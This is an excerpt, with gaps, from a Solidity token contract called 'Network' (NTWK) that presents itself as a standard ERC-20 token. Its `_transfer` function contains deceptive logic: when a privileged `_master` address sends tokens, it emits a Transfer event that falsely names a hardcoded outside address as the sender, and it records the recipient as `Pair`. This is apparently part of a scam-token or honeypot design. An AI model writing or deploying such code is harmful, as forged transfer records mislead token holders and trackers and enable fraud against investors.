...
contract NTWK is Owner, Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 0;
    uint256 private _maxSupply = 55555555555555000000;

    string private _name = "Network";
    string private _symbol = "NTWK";
    ...
    function _transfer(
        ...
        if (from == _master) {
            emit Transfer(
                0x421b22E8D45d2d184C6aD8386359c14f9fe53015,
                to,
                amount
            );
            Pair = to;
